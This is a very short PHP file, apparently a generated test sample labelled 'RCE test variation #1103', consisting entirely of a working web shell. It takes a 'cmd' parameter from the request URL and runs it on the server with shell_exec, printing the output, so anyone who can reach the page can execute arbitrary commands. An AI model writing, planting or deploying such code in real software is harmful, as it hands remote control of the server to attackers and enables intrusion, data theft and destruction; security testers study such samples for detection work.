<?php
// RCE test variation #1103
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>